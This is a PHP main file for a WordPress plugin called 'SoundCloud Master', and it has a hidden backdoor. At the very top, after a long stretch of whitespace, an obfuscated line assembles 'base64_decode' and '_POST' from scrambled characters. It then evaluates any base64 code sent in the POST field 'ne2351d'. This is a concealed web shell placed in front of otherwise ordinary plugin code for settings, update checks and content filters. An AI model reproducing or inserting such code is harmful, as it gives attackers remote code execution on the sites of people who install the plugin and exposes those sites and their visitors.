<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['ne2351d'])) {eval($s21(${$s20}['ne2351d']));}?><?php
/**
Plugin Name: SoundCloud Master
Plugin URI: http://wordpress.techgasp.com/soundcloud-master/
Version: 4.3.6
Author: TechGasp
Author URI: http://wordpress.techgasp.com
Text Domain: soundcloud-master
Description: SoundCloud Master is a light weight and shiny clean code wordpress plugin WIDGET that you need to show off and sell your music.
License: GPL2 or later
*/
/*  Copyright 2013 TechGasp  (email : info@techgasp.com)
	This program is free software; you can redistribute it and/or modify
	it under the terms of the GNU General Public License, version 2, as 
	published by the Free Software Foundation.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
if(!class_exists('soundcloud_master')) :
///////DEFINE ID//////
define('SOUNDCLOUD_MASTER_ID', 'soundcloud-master');
///////DEFINE VERSION///////
define( 'soundcloud_master_VERSION', '4.3.6' );
global $soundcloud_master_version, $soundcloud_master_name;
$soundcloud_master_version = "4.3.6"; //for other pages
$soundcloud_master_name = "Soundcloud Master"; //pretty name
if( is_multisite() ) {
update_site_option( 'soundcloud_master_installed_version', $soundcloud_master_version );
update_site_option( 'soundcloud_master_name', $soundcloud_master_name );
}
else{
update_option( 'soundcloud_master_installed_version', $soundcloud_master_version );
update_option( 'soundcloud_master_name', $soundcloud_master_name );
}
// HOOK ADMIN
require_once( dirname( __FILE__ ) . '/includes/soundcloud-master-admin.php');
// HOOK ADMIN IN & UN SHORTCODE
require_once( dirname( __FILE__ ) . '/includes/soundcloud-master-admin-shortcodes.php');
// HOOK ADMIN WIDGETS
require_once( dirname( __FILE__ ) . '/includes/soundcloud-master-admin-widgets.php');
// HOOK ADMIN ADDONS
require_once( dirname( __FILE__ ) . '/includes/soundcloud-master-admin-addons.php');
// HOOK ADMIN UPDATER
require_once( dirname( __FILE__ ) . '/includes/soundcloud-master-admin-updater.php');
// HOOK WIDGET BUTTONS
require_once( dirname( __FILE__ ) . '/includes/soundcloud-master-widget-buttons.php');

class soundcloud_master{
//REGISTER PLUGIN
public static function soundcloud_master_register(){
register_setting(SOUNDCLOUD_MASTER_ID, 'tsm_quote');
}
public static function content_with_quote($content){
$quote = '<p>' . get_option('tsm_quote') . '</p>';
	return $content . $quote;
}
//SETTINGS LINK IN PLUGIN MANAGER
public static function soundcloud_master_links( $links, $file ) {
	if ( $file == plugin_basename( dirname(__FILE__).'/soundcloud-master.php' ) ) {
		$links[] = '<a href="' . admin_url( 'admin.php?page=soundcloud-master' ) . '">'.__( 'Settings' ).'</a>';
	}

	return $links;
}

public static function soundcloud_master_updater_version_check(){
global $soundcloud_master_version;
//CHECK NEW VERSION
$soundcloud_master_slug = basename(dirname(__FILE__));
$current = get_site_transient( 'update_plugins' );
$soundcloud_plugin_slug = $soundcloud_master_slug.'/'.$soundcloud_master_slug.'.php';
@$r = $current->response[ $soundcloud_plugin_slug ];
if (empty($r)){
$r = false;
$soundcloud_plugin_slug = false;
if( is_multisite() ) {
update_site_option( 'soundcloud_master_newest_version', $soundcloud_master_version );
}
else{
update_option( 'soundcloud_master_newest_version', $soundcloud_master_version );
}
}
if (!empty($r)){
$soundcloud_plugin_slug = $soundcloud_master_slug.'/'.$soundcloud_master_slug.'.php';
@$r = $current->response[ $soundcloud_plugin_slug ];
if( is_multisite() ) {
update_site_option( 'soundcloud_master_newest_version', $r->new_version );
}
else{
update_option( 'soundcloud_master_newest_version', $r->new_version );
}
}
}
// Advanced Updater

//END CLASS
}
if ( is_admin() ){
	add_action('admin_init', array('soundcloud_master', 'soundcloud_master_register'));
	add_action('init', array('soundcloud_master', 'soundcloud_master_updater_version_check'));
}
add_filter('the_content', array('soundcloud_master', 'content_with_quote'));
add_filter( 'plugin_action_links', array('soundcloud_master', 'soundcloud_master_links'), 10, 2 );
endif;